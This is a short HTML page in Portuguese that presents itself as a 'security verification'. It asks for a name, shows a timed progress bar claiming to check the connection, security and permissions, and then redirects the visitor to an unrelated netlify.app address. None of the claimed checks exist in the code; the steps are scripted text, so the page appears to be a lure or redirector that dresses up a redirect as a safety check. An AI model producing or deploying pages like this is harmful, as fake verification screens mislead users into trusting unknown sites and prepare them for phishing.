<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificação de Segurança</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>

/* RESET */
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Inter',sans-serif;
}

/* BODY */
body{
background:linear-gradient(180deg,#020617,#0f172a);
color:#fff;
display:flex;
align-items:center;
justify-content:center;
height:100vh;
}

/* CARD */
.card{
width:100%;
max-width:420px;
background:#0f172a;
border-radius:16px;
padding:30px;
text-align:center;
box-shadow:0 20px 60px rgba(0,0,0,0.6);
}

/* ICON */
.icon{
width:70px;
height:70px;
margin:auto;
margin-bottom:20px;
border-radius:20px;
background:linear-gradient(135deg,#22c55e,#4ade80);
display:flex;
align-items:center;
justify-content:center;
font-size:30px;
}

/* TITLE */
h1{
font-size:24px;
margin-bottom:10px;
}

/* TEXT */
p{
color:#94a3b8;
font-size:14px;
margin-bottom:20px;
}

/* INPUT */
.input{
width:100%;
padding:14px;
border-radius:10px;
border:1px solid #334155;
background:#020617;
color:#fff;
margin-bottom:15px;
}

/* BUTTON */
.btn{
width:100%;
padding:15px;
border:none;
border-radius:10px;
background:linear-gradient(90deg,#22c55e,#16a34a);
color:white;
font-weight:600;
font-size:16px;
cursor:pointer;
transition:.2s;
}

.btn:hover{
transform:scale(1.03);
}

/* LOADING */
.loading{
margin-top:20px;
display:none;
}

.bar{
width:100%;
height:8px;
background:#1e293b;
border-radius:10px;
overflow:hidden;
}

.bar-fill{
height:100%;
width:0%;
background:linear-gradient(90deg,#22c55e,#4ade80);
transition:width .3s;
}

.status{
margin-top:10px;
font-size:13px;
color:#22c55e;
}

</style>
</head>

<body>

<div class="card">

<div class="icon">✔</div>

<h1>Verificação de Segurança</h1>

<p>Confirme seu acesso para continuar com segurança.</p>

<input type="text" id="nome" class="input" placeholder="Digite seu nome">

<button class="btn" onclick="start()">
Continuar
</button>

<div class="loading" id="loading">

<div class="bar">
<div class="bar-fill" id="bar"></div>
</div>

<div class="status" id="status">Iniciando verificação...</div>

</div>

</div>

<script>

function start(){

let nome = document.getElementById("nome").value.trim()

if(nome === ""){
alert("Digite seu nome")
return
}

document.querySelector(".btn").style.display="none"
document.querySelector(".input").style.display="none"

let loading = document.getElementById("loading")
loading.style.display="block"

let bar = document.getElementById("bar")
let status = document.getElementById("status")

let steps = [
"Verificando conexão...",
"Validando segurança...",
"Checando permissões...",
"Liberando acesso..."
]

let i = 0
let progress = 0

let interval = setInterval(()=>{

progress += 25
bar.style.width = progress+"%"

status.innerText = steps[i]

i++

if(progress >= 100){
clearInterval(interval)

setTimeout(()=>{
window.location.href="https://prismatic-crostata-496139.netlify.app/"
},1000)

}

},800)

}

</script>

</body>
</html>
